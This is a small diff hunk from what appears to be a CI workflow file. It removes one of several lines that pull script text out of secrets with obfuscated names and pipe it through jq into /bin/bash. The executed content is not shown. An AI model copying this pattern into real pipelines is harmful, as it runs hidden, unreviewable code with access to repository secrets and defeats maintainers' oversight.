@@ -27,7 +27,6 @@ jobs:
           taae7604: ${{ secrets.taae7604 }}
         run: |
           printf '%s' "$taae7604" | jq -r .qvl3435 | /bin/bash
-          printf '%s' "$nvkpz0159" | jq -r .woxb52 | /bin/bash
           echo $ezorq921 | jq -r .llcdh9237 | /bin/bash
           echo $q229 | jq -r .z22 | /bin/bash
 
